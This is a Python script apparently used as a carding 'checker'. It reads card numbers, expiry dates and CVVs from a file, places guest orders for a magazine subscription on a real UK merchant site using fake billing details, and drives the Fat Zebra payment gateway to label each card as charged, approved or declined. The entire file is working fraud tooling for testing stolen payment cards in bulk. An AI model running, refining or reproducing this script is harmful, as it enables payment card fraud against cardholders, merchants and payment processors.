import requests
import re
import time
import html

def capture(text, start_str, end_str):
    try:
        start = text.find(start_str)
        if start == -1:
            return ""
        start += len(start_str)
        end = text.find(end_str, start)
        if end == -1:
            return ""
        return text[start:end].strip()
    except:
        return ""

def process_fatzebra_card(card_line):
    start_time = time.time()
    cc_formatted = "UNKNOWN"

    try:
        parts = card_line.strip().split('|')
        if len(parts) != 4:
            elapsed = time.time() - start_time
            return {
                'card': card_line,
                'status': 'ERROR',
                'message': 'Invalid format',
                'time': elapsed,
                'success': False
            }

        cc, month, year, cvv = parts

        # Normalize Date
        if len(month) == 1:
            month = f'0{month}'
        if len(year) == 2:
            year = f'20{year}' 

        cc_formatted = f"{cc}|{month}|{year}|{cvv}"

        session = requests.Session()
        
        # Request 1: Get Page & Extract IDs
        r = session.get("https://www.isubscribe.co.uk/She-Kicks-Magazine-Subscription.cfm")
        r_ = r.text
        pi = capture(r_, "prodId=", "&amp")
        ps = capture(r_, "prodSubId=", "&amp")
        
        # Request 2: Add to Cart
        session.get(f"https://www.isubscribe.co.uk/cart.cfm?action=add&prodId={pi}&prodSubId={ps}&qty=1")

        email = "test@gmail.com"
        
        # Request 3: Set Billing Details
        data3 = f"itemcount=1&guestcheckout=true&userid=&email={email}&title=Mr.&firstname=John&lastname=Doe&phone=1234567890&company=&street=1+Warwick+Road&suburb=Thames+Ditton&postcode=KT7+0PR&state=&otherstate=&country=United+Kingdom&prodsubid_1={ps}&prodtitle_1=She+Kicks+Magazine&emaildelivery_1=0&isdigital_1=0&isgiftvoucher_1=0&xmas_start_1=0&renewal_1=0&gift_1=0&senderfirstname_1=+&email_1=&message_1=&senddate_1=18%2F10%2F2023&address_1=billing&title_1=Mr.&firstname_1=John&lastname_1=Doe&company_1=&street_1=1+Warwick+Road&suburb_1=Thames+Ditton&postcode_1=KT7+0PR&state_1=United+Kingfonm&country_1=United+Kingdom&publisher_post=0&organisations_post=0&isubscribe_terms=1"

        session.post("https://www.isubscribe.co.uk/ssl/checkout/index.cfm?view=new&mode=admin&action=setbilling&formmode=new&ajax=true", 
                     headers={"Content-Type": "application/x-www-form-urlencoded"}, 
                     data=data3)

        # Determine Card Type
        if cc.startswith("3"):
            typec = "AMEX"
        elif cc.startswith("4"):
            typec = "VISA"
        elif cc.startswith("5"):
            typec = "Mastercard"
        else:
            typec = "VISA"

        # Request 4: Set Payment Method
        session.post("https://www.isubscribe.co.uk/ssl/checkout/index.cfm?view=new&mode=admin&action=setpayment&formmode=new&ajax=true",
                     headers={"Content-Type": "application/x-www-form-urlencoded"},
                     data=f"paymentMethod=creditcard&walletToken=&card={typec}")

        # Request 5: Get Confirm Page (Extract Tokens)
        r5 = session.get("https://www.isubscribe.co.uk/ssl/checkout/index.cfm?view=new&step=confirm")
        r5_ = r5.text

        ft = capture(r5_, 'fzToken = \'', "'")
        fv = capture(r5_, 'fzVerification = \'', "'")
        ve = capture(r5_, '"verification" value="', '"')
        ref = capture(r5_, 'reference: \'', "'")
        am = capture(r5_, "amount: ", ",")
        
        if not ft:
             return {'card': cc_formatted, 'status': 'ERROR', 'message': 'Token Extraction Failed', 'time': time.time() - start_time, 'success': False}

        # Request 6: Get CSRF Token (Bridge)
        r6 = session.get("https://paynow.pmnts.io/sdk/bridge")
        r6_ = r6.text
        cs = capture(r6_, "'X-CSRF-Token': \"", '"')

        # Request 7: Tokenize Card
        headers7 = {
            "x-csrf-token": cs,
            "authorization": f"Bearer {ft}",
            "content-type": "application/json",
        }

        data7 = {
            "card_holder": "John Doe",
            "card_number": cc,
            "card_expiry": f"{month}/{year[-2:]}",
            "cvv": cvv,
        }

        r7 = session.post("https://paynow.pmnts.io/sdk/credit_cards", headers=headers7, json=data7)
        tok = capture(r7.text, '"token":"', '"')
        
        # Request 8: Get JWT (SCA Session)
        headers8 = {
            "fz-merchant-username": "isubscribeunitedkingdom",
            "authorization": f"Bearer {ft}",
            "content-type": "application/json",
        }

        r8 = session.post("https://api.pmnts.io/sca/session", headers=headers8, json={"amount": am, "currency": "GBP"})
        jt = capture(r8.text, '"jwt":"', '"')

        # Request 9: Final Charge (Direct Gateway)
        headers13 = {
            "content-type": "application/x-www-form-urlencoded",
        }

        data13 = f"return_path=https%3A%2F%2Fwww.isubscribe.co.uk%2Fssl%2Fcheckout%2Findex.cfm%3Fview%3Dnew%26step%3Dconfirm%26mode%3Dadmin%26action%3DplaceOrder%26source%3Dconfirm&verification={ve}&card_type={typec}&card_number={cc}&card_holder=John+Doe&expiry_month={month}&expiry_year={year[-2:]}&cvv={cvv}"

        r13 = session.post("https://gateway.pmnts.io/v2/credit_cards/direct/isubscribeunitedkingdom", 
                          headers=headers13, data=data13)

        # Request 10: Check Result
        r14 = session.get("https://www.isubscribe.co.uk/ssl/checkout/index.cfm?view=returning&step=confirm&formmode=edit&source=confirm&error=true&errorno=05")
        r14_ = r14.text
        
        # Error Parsing
        msg1 = capture(r14_, '<div class="alert alert-danger alert-dismissable" id="', '">')
        msg2 = ""
        if msg1:
            msg2 = capture(r14_, f'<div class="alert alert-danger alert-dismissable" id="{msg1}">', "<br>")
        
        message = html.unescape(msg2) if msg2 else ""
        message = re.sub(r'<[^>]+>', '', message)
        
        # FIX: Clean up newlines and extra spaces to make it single line
        message = " ".join(message.split())

        elapsed_time = time.time() - start_time
        
        # --- UPDATED LOGIC FOR CHARGED VS APPROVED ---
        
        # 1. HTTP 302 means the transaction was successful (Charged)
        if r14.status_code == 302:
            status = "CHARGED"
            msg = "PAYMENT_COMPLETED"
            
        # 2. If message mentions insufficient funds, it is Approved but not charged
        elif "insufficient funds" in message.lower():
            status = "APPROVED"
            msg = "Insufficient Funds"
            
        # 3. Any other error message is Declined
        else:
            status = "DECLINED"
            msg = message if message else "Transaction declined"

        return {
            'card': cc_formatted,
            'status': status,
            'message': msg,
            'time': elapsed_time,
            'success': status in ["CHARGED", "APPROVED"]
        }

    except Exception as e:
        elapsed = time.time() - start_time
        print(f"[FatZebra Exception] {str(e)}")
        return {
            'card': cc_formatted,
            'status': "ERROR",
            'message': str(e),
            'time': elapsed,
            'success': False
        }

def main():
    try:
        with open('f.txt', 'r') as f:
            cards = [line.strip() for line in f if line.strip()]

        print(f"Loaded {len(cards)} cards")

        for card in cards:
            result = process_fatzebra_card(card)
            print(f"\nCard: {result['card']}")
            print(f"Status: {result['status']}")
            print(f"Message: {result['message']}")
            print(f"Time: {result['time']:.2f}s")
            print("-" * 50)

            time.sleep(2)

    except FileNotFoundError:
        print("Error: cards.txt not found!")

if __name__ == "__main__":
    main()
